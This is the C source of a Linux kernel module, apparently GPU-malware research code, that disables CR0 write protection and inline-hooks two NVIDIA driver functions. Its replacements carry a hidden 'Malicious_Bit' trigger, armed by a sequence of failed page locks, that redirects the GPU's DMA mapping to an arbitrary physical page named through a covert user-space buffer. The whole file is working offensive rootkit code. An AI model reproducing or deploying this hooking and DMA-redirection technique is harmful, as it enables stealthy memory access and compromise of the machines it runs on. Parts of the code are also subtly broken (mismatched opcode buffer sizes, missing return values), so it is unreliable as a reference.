/*
	My hook engine v0.30

	by wzt	<wzt@xsec.org>, modifed by YR

        tested on  amd64
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/spinlock.h>
#include <linux/smp.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/unistd.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/tty.h>
#include <linux/tty_driver.h>
#include <net/sock.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/siginfo.h>
#include <linux/stat.h>


#include <linux/interrupt.h>        /* tasklets, interrupt helpers      */
#include <linux/pci.h>              /* pci_find_class, etc              */
#include <linux/pagemap.h>

#include <linux/syscalls.h>
#include "config.h"
//#include "k_file.h"

//#include "hide_file.c"
#include "hook.h"
//#include "nv-misc.h"
#include "nvtypes.h"
#include "cpuopsys.h"
#include "rmretval.h"
//#include "os-interface.h"
#include "conftest.h"
//#include "nv.h"
//#include "nv-linux.h"

//MODULE_LICENSE("GPL");
//MODULE_AUTHOR("Peter Jay Salzman");

static unsigned long int m_lock_addr = 0xffffffffffffffff;
static unsigned long int dma_map_addr = 0xffffffffffffffff;

module_param(m_lock_addr,ulong ,0000);
module_param(dma_map_addr,ulong ,0000);

// usage : insmod hook.ko m_lock_addr=0x... dma_map_addr=0x... 

/*
 * ptr arithmetic convenience
 */


///////////////////////////////////////////////////////////////////////
// https://github.com/lll-project/nvidia/blob/cc3f490e62031d315ce5cd92be87e2a083a80ae8/include/nvidia/nv.h
///////////////////////////////////////////////////////////////////////

typedef union
{
    volatile NvV8 Reg008[1];
    volatile NvV16 Reg016[1];
    volatile NvV32 Reg032[1];
} nv_hwreg_t, * nv_phwreg_t;

#define NVRM_PCICFG_NUM_BARS            6
#define NVRM_PCICFG_BAR_OFFSET(i)       (0x10 + (i) * 4)
#define NVRM_PCICFG_BAR_REQTYPE_MASK    0x00000001
#define NVRM_PCICFG_BAR_REQTYPE_MEMORY  0x00000000
#define NVRM_PCICFG_BAR_MEMTYPE_MASK    0x00000006
#define NVRM_PCICFG_BAR_MEMTYPE_64BIT   0x00000004
#define NVRM_PCICFG_BAR_ADDR_MASK       0xfffffff0

#define NVRM_PCICFG_NUM_DWORDS          64

#define NV_GPU_NUM_BARS                 3
#define NV_GPU_BAR_INDEX_REGS           0
#define NV_GPU_BAR_INDEX_FB             1
#define NV_GPU_BAR_INDEX_IMEM           2

typedef struct
{
    NvU64 cpu_address;
    NvU64 bus_address;
    NvU64 strapped_size;
    NvU64 size;
    NvU32 offset;
    NvU32 *map;
    nv_phwreg_t map_u;
} nv_aperture_t;

typedef struct
{
    char *node;
    char *name;
    NvU32 *data;
} nv_parm_t;

#define NV_RM_PAGE_SHIFT    12
#define NV_RM_PAGE_SIZE     (1 << NV_RM_PAGE_SHIFT)
#define NV_RM_PAGE_MASK     (NV_RM_PAGE_SIZE - 1)

#define NV_RM_TO_OS_PAGE_SHIFT      (OS_PAGE_SHIFT - NV_RM_PAGE_SHIFT)
#define NV_RM_PAGES_PER_OS_PAGE     (1U << NV_RM_TO_OS_PAGE_SHIFT)
#define NV_RM_PAGES_TO_OS_PAGES(count) \
    ((((NvUPtr)(count)) >> NV_RM_TO_OS_PAGE_SHIFT) + \
     ((((count) & ((1 << NV_RM_TO_OS_PAGE_SHIFT) - 1)) != 0) ? 1 : 0))

#if defined(NVCPU_X86_64)
#define NV_STACK_SIZE (NV_RM_PAGE_SIZE * 3)
#else
#define NV_STACK_SIZE (NV_RM_PAGE_SIZE * 2)
#endif

typedef struct nv_stack_s
{
    NvU32 size;
    void *top;
    NvU8  stack[NV_STACK_SIZE-16] __attribute__ ((aligned(16)));
} nv_stack_t;


typedef struct {
    NvU32    domain;        /* PCI domain number   */
    NvU8     bus;           /* PCI bus number      */
    NvU8     slot;          /* PCI slot number     */
    NvU8     function;      /* PCI function number */
    NvU16    vendor_id;     /* PCI vendor ID       */
    NvU16    device_id;     /* PCI device ID       */
    NvBool   valid;         /* validation flag     */
} nv_pci_info_t;

/*
 * this is a wrapper for unix events
 * unlike the events that will be returned to clients, this includes
 * kernel-specific data, such as file pointer, etc..
 */
typedef struct nv_event_s
{
    NvU32 hParent;
    NvU32 hObject;
    NvU32 index;
    void  *file;  /* per file-descriptor data pointer */
    NvU32 handle;
    NvU32 fd;
    struct nv_event_s *next;
} nv_event_t;

typedef struct nv_kern_mapping_s
{
    void  *addr;
    NvU64 size;
    struct nv_kern_mapping_s *next;
} nv_kern_mapping_t;

typedef struct nv_mmap_context_s
{
    NvP64 addr;
    NvU64 size;
    NvU32 process_id;
    NvU32 thread_id;
    void *file;
    void *os_priv;
    struct nv_mmap_context_s *next;
} nv_mmap_context_t;

/*
 * per device state
 */

typedef struct
{
    void  *priv;                    /* private data */
    void  *os_state;                /* os-specific device state */

    int    flags;

    /* PCI config info */
    nv_pci_info_t pci_info;
    NvU16 subsystem_id;
    NvU32 gpu_id;
    void *handle;

    NvU32 pci_cfg_space[NVRM_PCICFG_NUM_DWORDS];

    /* physical characteristics */
    nv_aperture_t bars[NV_GPU_NUM_BARS];
    nv_aperture_t *regs;
    nv_aperture_t *fb, ud;

    NvU32  interrupt_line;

    NvU32 primary_vga;

    NvU32 sim_env;

    NvU32 rc_timer_enabled;

    /* list of events allocated for this device */
    nv_event_t *event_list;

    nv_kern_mapping_t *kern_mappings;

    nv_mmap_context_t *mmap_contexts;

    /* DMA addressable range of the device */
    NvU64 dma_addressable_start;
    NvU64 dma_addressable_limit;
} nv_state_t;


#define READ_NUM	200


///////////////////////////////////////////////////////////////////////
// https://github.com/lll-project/nvidia/blob/cc3f490e62031d315ce5cd92be87e2a083a80ae8/include/nvidia/nv-linux.h
///////////////////////////////////////////////////////////////////////

/*
 * ---------------------------------------------------------------------------
 *
 * Function prototypes for UNIX specific OS interface.
 *
 * ---------------------------------------------------------------------------
 */

/*
 * Make sure that arguments to and from the core resource manager
 * are passed and expected on the stack. define duplicated in os-interface.h
 */
#if !defined(NV_API_CALL)
#if defined(NVCPU_X86)
#if defined(__use_altstack__)
#define NV_API_CALL __attribute__((regparm(0),altstack(false)))
#else
#define NV_API_CALL __attribute__((regparm(0)))
#endif
#elif defined(NVCPU_X86_64) && defined(__use_altstack__)
#define NV_API_CALL __attribute__((altstack(false)))
#else
#define NV_API_CALL
#endif
#endif /* !defined(NV_API_CALL) */


typedef struct nv_dma_map_s {
    struct page **user_pages;
    struct pci_dev *dev;
} nv_dma_map_t;


typedef struct work_struct nv_task_t;

typedef struct nv_work_s {
    nv_task_t task;
    void *data;
} nv_work_t;

#define NV_MAX_REGISTRY_KEYS_LENGTH   512

/* linux-specific version of old nv_state_t */
/* this is a general os-specific state structure. the first element *must* be
   the general state structure, for the generic unix-based code */
typedef struct nv_linux_state_s {
    nv_state_t nv_state;
    atomic_t usage_count;

    struct pci_dev *dev;

    nv_stack_t *timer_sp;
    nv_stack_t *isr_sp;
    nv_stack_t *pci_cfgchk_sp;
    nv_stack_t *isr_bh_sp;

    char registry_keys[NV_MAX_REGISTRY_KEYS_LENGTH];

    /* keep track of any pending bottom halfes */
    struct tasklet_struct tasklet;
    nv_work_t work;

    /* get a timer callback every second */
    struct timer_list rc_timer;

    /* lock for linux-specific data, not used by core rm */
    struct semaphore ldata_lock;

    /* proc directory information */
    struct proc_dir_entry *proc_dir;

    NvU32 minor_num;
    struct nv_linux_state_s *next;

    /* DRM private information */
    struct drm_device *drm;
} nv_linux_state_t;


#define NV_GET_NVL_FROM_NV_STATE(nv)    ((nv_linux_state_t *)nv->os_state)


#if defined(NV_PCI_DMA_MAPPING_ERROR_PRESENT)
#if (NV_PCI_DMA_MAPPING_ERROR_ARGUMENT_COUNT == 2)
#define NV_PCI_DMA_MAPPING_ERROR(dev, addr) \
    pci_dma_mapping_error(dev, addr)
#elif (NV_PCI_DMA_MAPPING_ERROR_ARGUMENT_COUNT == 1)
#define NV_PCI_DMA_MAPPING_ERROR(dev, addr) \
    pci_dma_mapping_error(addr)
#else
#error "NV_PCI_DMA_MAPPING_ERROR_ARGUMENT_COUNT value unrecognized!"
#endif
#elif defined(NV_VM_INSERT_PAGE_PRESENT)
#error "NV_PCI_DMA_MAPPING_ERROR() undefined!"
#endif

#if defined(NV_PCI_DOMAIN_NR_PRESENT)
#define NV_PCI_DOMAIN_NUMBER(dev)     (NvU32)pci_domain_nr(dev->bus)
#else
#define NV_PCI_DOMAIN_NUMBER(dev)     (0)
#endif
#define NV_PCI_BUS_NUMBER(dev)        (dev)->bus->number
#define NV_PCI_DEVFN(dev)             (dev)->devfn
#define NV_PCI_SLOT_NUMBER(dev)       PCI_SLOT(NV_PCI_DEVFN(dev))

#define IS_DMA_ADDRESSABLE(nv, offset)                                          \
    (((offset) >= (nv)->dma_addressable_start) &&                               \
     ((offset) <= (nv)->dma_addressable_limit))

#ifndef NV_ALIGN_UP
#define NV_ALIGN_UP(v,g) (((v) + ((g) - 1)) & ~((g) - 1))
#endif
#ifndef NV_ALIGN_DOWN
#define NV_ALIGN_DOWN(v,g) ((v) & ~((g) - 1))
#endif

#if !defined(DEBUG) && defined(__GFP_NOWARN)
#define NV_GFP_KERNEL (GFP_KERNEL | __GFP_NOWARN)
#define NV_GFP_ATOMIC (GFP_ATOMIC | __GFP_NOWARN)
#else
#define NV_GFP_KERNEL (GFP_KERNEL)
#define NV_GFP_ATOMIC (GFP_ATOMIC)
#endif

typedef spinlock_t                nv_spinlock_t;
#define NV_SPIN_LOCK_INIT(lock)   spin_lock_init(lock)
#define NV_SPIN_LOCK_IRQ(lock)    spin_lock_irq(lock)
#define NV_SPIN_UNLOCK_IRQ(lock)  spin_unlock_irq(lock)
#define NV_SPIN_LOCK_IRQSAVE(lock,flags) spin_lock_irqsave(lock,flags)
#define NV_SPIN_UNLOCK_IRQRESTORE(lock,flags) spin_unlock_irqrestore(lock,flags)
#define NV_SPIN_LOCK(lock)        spin_lock(lock)
#define NV_SPIN_UNLOCK(lock)      spin_unlock(lock)
#define NV_SPIN_UNLOCK_WAIT(lock) spin_unlock_wait(lock)

#define NV_IN_ATOMIC()                  in_atomic()

#define NV_MAY_SLEEP()                  (!irqs_disabled() && !in_interrupt() && !NV_IN_ATOMIC())

#define NV_MEM_TRACKING_HIDE_SIZE(ptr, size)            \
    if ((ptr != NULL) && (*(ptr) != NULL))              \
    {                                                   \
        NvU8 *__ptr;                                    \
        *(unsigned long *) *(ptr) = (size);             \
        __ptr = *(ptr); __ptr += sizeof(void *);        \
        *(ptr) = (void *) __ptr;                        \
    }
#define NV_MEM_TRACKING_RETRIEVE_SIZE(ptr, size)        \
    {                                                   \
        NvU8 *__ptr = (ptr); __ptr -= sizeof(void *);   \
        (ptr) = (void *) __ptr;                         \
        (size) = *(unsigned long *) (ptr);              \
    }

#define NV_MEM_TRACKING_PAD_SIZE(size) \
    (size) = NV_ALIGN_UP((size + sizeof(void *)), sizeof(void *))


#if defined(NV_GET_NUM_PHYSPAGES_PRESENT)
#define NV_NUM_PHYSPAGES                get_num_physpages()
#else
#define NV_NUM_PHYSPAGES                num_physpages
#endif

#define NV_KMALLOC(ptr, size) \
    { \
        (ptr) = kmalloc(size, NV_GFP_KERNEL);}

#define NV_KMALLOC_ATOMIC(ptr, size) \
    { \
        (ptr) = kmalloc(size, NV_GFP_ATOMIC); }

#define NV_VMALLOC(ptr, size)  (ptr) = __vmalloc(size, GFP_KERNEL, PAGE_KERNEL);


#define NV_KFREE(ptr, size)  kfree((void *) (ptr));
#define NV_VFREE(ptr, size) vfree((void *) (ptr));


///////////////////////////////////////////////////////////////////////
// Hook engine
///////////////////////////////////////////////////////////////////////

unsigned int system_call_addr = 0;
unsigned int sys_call_table_addr = 0;

unsigned int sys_read_addr = 0;
unsigned int sys_getdents64_addr = 0;
unsigned int sys_kill_addr = 0;
unsigned int kill_something_info_addr = 0;

int hook_kill_something_info_flag = 1;
int hook_vfs_read_flag = 1;



unsigned int filldir64_addr = 0;
unsigned char old_dma_opcode[5];
unsigned char old_mlock_opcode[5];

long get_pfn_of_virtual_address(unsigned long, unsigned long *);

unsigned long global_hidden_addr = 0x4000000;
unsigned int Malicious_Bit = 0;

typedef struct hidden_driver_info // For comfort reasons, define the hidden buffer struct in driver too.
{
	long int start_addr;
	long int end_addr;
} hidden_driver_info ,*p_hidden_info;

long get_pfn_of_virtual_address(unsigned long address, unsigned long * pfn)
{
	/*
	 * Get Page Frame Number. (AKA Phys. Addr shl by 12 bit)
	 */

	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *ptep;
	spinlock_t *ptl;
	struct mm_struct *mm;
	struct mm_struct *mm1;
	struct vm_area_struct *vma;

	//Get VMA of Current tsk struct. CHANGE if you want different Proc.
	mm1 = current->mm;
	DbgPrint("***YR NVRM: Looking for page_num. mm: %llx, addr: %llx!***\n",mm1,address);
	vma = find_vma(mm1,address);
	mm = vma->vm_mm;

	//Get Page Global Dir.
	pgd = pgd_offset(mm, address);
	if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd)))
	return -EFAULT;

	//Get Page Upper Dir.
	pud = pud_offset(pgd, address);
	if (pud_none(*pud) || unlikely(pud_bad(*pud)))
	return -EFAULT;

	// Get Page Middle Dir.
	pmd = pmd_offset(pud, address);
	if (pmd_none(*pmd))
	return -EFAULT;

	// Get Page table entry, and get PFN from it:
	ptep = pte_offset_map_lock(mm, pmd, address, &ptl);
	*pfn = pte_pfn(*ptep);
	pte_unmap_unlock(ptep, ptl);

	return 0;

}


//////////////////////////////////////////////////////////////////////
//
// https://github.com/lll-project/nvidia/blob/master/src/os-interface.c


/*
 * Operating System Memory Functions
 *
 * There are 2 interesting aspects of resource manager memory allocations
 * that need special consideration on Linux:
 *
 * 1. They are typically very large, (e.g. single allocations of 164KB)
 *
 * 2. The resource manager assumes that it can safely allocate memory in
 *    interrupt handlers.
 *
 * The first requires that we call vmalloc, the second kmalloc. We decide
 * which one to use at run time, based on the size of the request and the
 * context. Allocations larger than 128KB require vmalloc, in the context
 * of an ISR they fail.
 */

#define KMALLOC_LIMIT 131072
#define VMALLOC_ALLOCATION_SIZE_FLAG (1 << 0)

RM_STATUS NV_API_CALL os_alloc_mem(
    void **address,
    NvU32 size
)
{
    if (address == NULL)
        return RM_ERR_INVALID_ARGUMENT;

    *address = NULL;
    NV_MEM_TRACKING_PAD_SIZE(size);

    if (!NV_MAY_SLEEP())
    {
        if (size <= KMALLOC_LIMIT)
            NV_KMALLOC_ATOMIC(*address, size);
    }
    else
    {
        if (size <= KMALLOC_LIMIT)
        {
            NV_KMALLOC(*address, size);
        }
        if (*address == NULL)
        {
            NV_VMALLOC(*address, size);
            size |= VMALLOC_ALLOCATION_SIZE_FLAG;
        }
    }

    NV_MEM_TRACKING_HIDE_SIZE(address, size);

    return ((*address != NULL) ? RM_OK : RM_ERR_NO_MEMORY);
}

void NV_API_CALL os_free_mem(void *address)
{
    NvU32 size;

    NV_MEM_TRACKING_RETRIEVE_SIZE(address, size);

    if (size & VMALLOC_ALLOCATION_SIZE_FLAG)
    {
        size &= ~VMALLOC_ALLOCATION_SIZE_FLAG;
        NV_VFREE(address, size);
    }
    else
        NV_KFREE(address, size);
}

//
//////////////////////////////////////////////////////////////////////


NvU64 NV_API_CALL os_get_num_phys_pages(void)
{
    return (NvU64)NV_NUM_PHYSPAGES;
}

// Substitution for dma_map_addr
RM_STATUS NV_API_CALL new_funct( nv_state_t *nv,
	    NvU64       page_count,
	    NvU64      *pte_array,
	    void      **priv) {

	  RM_STATUS status;
	    NvU64 i, j;
	    nv_linux_state_t *nvl = NV_GET_NVL_FROM_NV_STATE(nv);
	    nv_dma_map_t *dma_map = NULL;
	    struct page **user_pages;
	    struct mm_struct *mm = current->mm;

	    // New vars:
	    static NvU64 hidden_Page;
	    static int counter = 0;
	    NvU64 newpage;
	    unsigned long page_number ;
	    p_hidden_info info_buffer;
		RM_STATUS rets;
		int ret;
		NvBool write = 1, force = 0;

		DbgPrint("This is Replacemnt funct, Entering!\n");
		DbgPrint("***YR NVRM: entering dma_map. Adrres of funct:0x%llx !***\n",(unsigned long int)new_funct);
		DbgPrint("***YR NVRM: entering dma_map!***\n");

			DbgPrint("Page count is: %d\n",page_count);
			if (priv == NULL)
		    {
		        /*
		         * IOMMU path has not been implemented yet to handle
		         * anything except a nv_dma_map_t as the priv argument.
		         */
		        return RM_ERR_NOT_SUPPORTED;
		    }

		    if (page_count > os_get_num_phys_pages())
		    {
		        DbgPrint("NVRM: DMA mapping request too large!\n");
		        return RM_ERR_INVALID_REQUEST;
		    }

		    status = os_alloc_mem((void **)&dma_map, sizeof(nv_dma_map_t));
		    if (status != RM_OK)
		    {
		        DbgPrint("NVRM: Failed to allocate nv_dma_map_t!\n");
		        return status;
		    }

		    dma_map->user_pages = *priv;
		    dma_map->dev = nvl->dev;

		    // Start getting Phys addr from Pages.
		    for (i = 0; i < page_count; i++)
		    {
		    	//Standart:
				pte_array[i] = pci_map_page(dma_map->dev, dma_map->user_pages[i], 0,
		                PAGE_SIZE,
		                PCI_DMA_BIDIRECTIONAL);

				DbgPrint( "*** YR, pte_array[i] is 0x%llx ***\n",pte_array[i]);
				DbgPrint( "*** Page size is: %d\n",PAGE_SIZE);

				if (counter==0 ) // First is for setting up the adress through which the info will be passed
				{
					if (Malicious_Bit==1)
					{
						counter++;
						DbgPrint( "*** Counter = %d ***, Mal bit was %d\n",counter,Malicious_Bit);
						Malicious_Bit = 0;
					}
					hidden_Page=0x1000;
					DbgPrint( "*** Counter = %d ***\n",counter);
					DbgPrint( "page of hidden buffer: 0x%llx",dma_map->user_pages[i]);
				}
				else // Now remapping according to what was passed in buffer.
				{
					DbgPrint( "*** Counter = %d ***\n",counter);
					newpage = global_hidden_addr;
					DbgPrint( "*** YR, hidden buffer struct user v_addr is: 0x%llx ***\n",newpage);


					rets = os_alloc_mem((void **)&info_buffer, sizeof(hidden_driver_info));
					if (rets != RM_OK)
		   			{
		   			     DbgPrint("YR: failed to allocate buffer in kernel mode!\n");
		   			     counter = 0;
		   			     Malicious_Bit = 0;
		   			     return rets;
		    		}

					rets=copy_from_user((void*)info_buffer,(void*)global_hidden_addr,sizeof(hidden_driver_info));
					if (rets != RM_OK)
		   			{
		   			     DbgPrint( "YR: failed to copy from user!\n");
		   			     counter = 0;
		   			     Malicious_Bit = 0;
		   			     return rets;
		   			}
					DbgPrint( "*** buffer contains after copy: 0x%llx	, 0x:%llx\n",info_buffer->start_addr,info_buffer->end_addr);

					// Now, we have the addresses to

					rets=os_alloc_mem((void **)&user_pages,(1 * sizeof(*user_pages)));
					if (rets != RM_OK)
					{
					   	DbgPrint("YR: failed to allocate buffer for page nums in kernel mode!\n");
					   	counter = 0;
					   	Malicious_Bit = 0;
					   	return rets;
					}
					DbgPrint("YR: allocated buffer for page nums\n");
					down_read(&mm->mmap_sem);
		    			//ret = get_user_pages(current, mm, (unsigned long)info_buffer->start_addr,1, write, force, user_pages, NULL);
						ret = get_pfn_of_virtual_address((unsigned long)info_buffer->start_addr,  &page_number);
					up_read(&mm->mmap_sem);
		    		if (ret < 0)
		    		{
		    			DbgPrint("YR: failed to get user pages\n");
		    			os_free_mem(user_pages);
		    			counter = 0;
		    			Malicious_Bit = 0;
		    			return RM_ERR_INVALID_ADDRESS;
		    		}
		    		DbgPrint("YR: Got PFN\n");

		    		DbgPrint("YR: PFN: 0x%llx\n",page_number);
		    		pte_array[i] = page_number * 0x1000;

		    		//pte_array[i] = pci_map_page(dma_map->dev, user_pages[0], 0,PAGE_SIZE,PCI_DMA_BIDIRECTIONAL);
					DbgPrint("YR: physical address: 0x%llx\n",pte_array[i]);
					counter = 0;
				}

			if (NV_PCI_DMA_MAPPING_ERROR(dma_map->dev, pte_array[i]) ||
		            (!IS_DMA_ADDRESSABLE(nv, pte_array[i])))
		        {
				DbgPrint("NVRM: failed to create a DMA mapping!\n");
		            if (!IS_DMA_ADDRESSABLE(nv, pte_array[i]))
		            {
		            	DbgPrint("NVRM: DMA address not in addressable range of device "
		                        "%04x:%02x:%02x (0x%llx, 0x%llx-0x%llx)\n",
		                        NV_PCI_DOMAIN_NUMBER(dma_map->dev),
		                        NV_PCI_BUS_NUMBER(dma_map->dev),
		                        NV_PCI_SLOT_NUMBER(dma_map->dev),
		                        pte_array[i], nv->dma_addressable_start,
		                        nv->dma_addressable_limit);
		                status = RM_ERR_INVALID_ADDRESS;
		            }
		            else
		            {
		                status = RM_ERR_OPERATING_SYSTEM;
		            }

		            for (j = 0; j < i; j++)
		            {
		                pci_unmap_page(dma_map->dev, pte_array[j],
		                        PAGE_SIZE, PCI_DMA_BIDIRECTIONAL);
		            }

		            os_free_mem(dma_map);
		            return status;
		        }
		    }

		    *priv = dma_map;

		    return RM_OK;
}
typedef RM_STATUS (*NV_API_CALL p_new_funct)( nv_state_t *nv,
	    NvU64       page_count,
	    NvU64      *pte_array,
	    void      **priv);


// Substitution for m_lock_addr
RM_STATUS NV_API_CALL new_os_lock_user_pages(
    void   *address,
    NvU64   page_count,
    void  **page_array) {

#if defined(NV_VM_INSERT_PAGE_PRESENT)
    RM_STATUS rmStatus;
    struct mm_struct *mm = current->mm;
    struct page **user_pages;
    NvU32 i, pinned;
    NvBool write = 1, force = 0;
    int ret;
    static int first =0;
    static int Mal_lock = 0;

	//* YR addition: 
	DbgPrint("***YR NVRM: entering os_lock_user_pages!***\n");
    if (!NV_MAY_SLEEP())
    {
		DbgPrint("NVRM: os_lock_user_memory(): invalid context!\n");
        return RM_ERR_NOT_SUPPORTED;
    }

    rmStatus = os_alloc_mem((void **)&user_pages,(page_count * sizeof(*user_pages)));
    if (rmStatus != RM_OK)
    {
        DbgPrint("NVRM: failed to allocate page table!\n");
        return rmStatus;
    }
	
	//add store to address: YR
	DbgPrint("***YR NVRM: Mapping Virtual Address: 0x%llx**\n",(unsigned long)address);

    down_read(&mm->mmap_sem);
		ret = get_user_pages(current, mm, (unsigned long)address,page_count, write, force, user_pages, NULL);
    up_read(&mm->mmap_sem);
    pinned = ret;

    if (first ==0 )
    {
    	DbgPrint("***YR NVRM - first os-mlock***/n");
    	Malicious_Bit = 0;
    	first++;
    }

    if (ret < 0)
    {
    	if (Mal_lock == 0)
    	{
    		DbgPrint("***YR NVRM: Error in getUPages N.%d ***/n",Mal_lock);
    		Mal_lock++;
    	}
    	else if (Mal_lock == 1)
    	{
    		DbgPrint("***YR NVRM: Error in getUPages N.%d ***/n",Mal_lock);
    		Mal_lock++;
    	}
    	else if (Mal_lock == 2)
    	{
    		DbgPrint("***YR NVRM: 3 Errors in a a row. Unlocking Malcious Bit!****/n");
    		Malicious_Bit = 1;

    	}
        os_free_mem(user_pages);
        return RM_ERR_INVALID_ADDRESS;
    }
    else if (pinned < page_count)
    {
        for (i = 0; i < pinned; i++)
            page_cache_release(user_pages[i]);
        os_free_mem(user_pages);
        return RM_ERR_INVALID_ADDRESS;
    }
    if (Malicious_Bit == 1)
    {
    	DbgPrint("***YR NVRm: Mal bit was 1, hidden buffer gets addr/n");
    	global_hidden_addr = (unsigned long)address;
    }
    Mal_lock = 0;

    *page_array = user_pages;

    return RM_OK;
#else
    return RM_ERR_NOT_SUPPORTED;
#endif
}

static int inline_hook_func(unsigned long int old_func, unsigned long int new_func,
	unsigned char *old_opcode)
{
        unsigned char *buf;
        unsigned int p;
        int i;

        buf = (unsigned char *)old_func;
        memcpy(old_opcode, buf, 6);

				//calculate offset between new function and old one (32 BIT!)
        p = (unsigned long int)new_func - (unsigned long int)old_func - 5; 

        buf[0] = 0xe9; // JUMP opcode
        memcpy(buf + 1, &p, 4);
        buf[5]= 0xc3 ; // ret opcode (near ret mind you)
}

static int restore_inline_hook(unsigned long int old_func, unsigned char *old_opcode)
{
        unsigned char *buf;

        buf = (unsigned char *)old_func;
        memcpy(buf, old_opcode, 6);
}

static int hook_init(void)
{
	
        CLEAR_CR0()
        inline_hook_func(dma_map_addr, (unsigned long int)new_funct,
						old_dma_opcode);
		    inline_hook_func(m_lock_addr,(unsigned long int)new_os_lock_user_pages, 
						old_mlock_opcode);
        SET_CR0()
        DbgPrint("install hook ok.\n");

        return 0;
}

static void hook_exit(void)
{
       
    CLEAR_CR0()
    restore_inline_hook(dma_map_addr, old_dma_opcode);
		restore_inline_hook(m_lock_addr,  old_mlock_opcode);
	  SET_CR0()

	  DbgPrint("uninstall hook ok.\n");
}

module_init(hook_init);
module_exit(hook_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wzt");
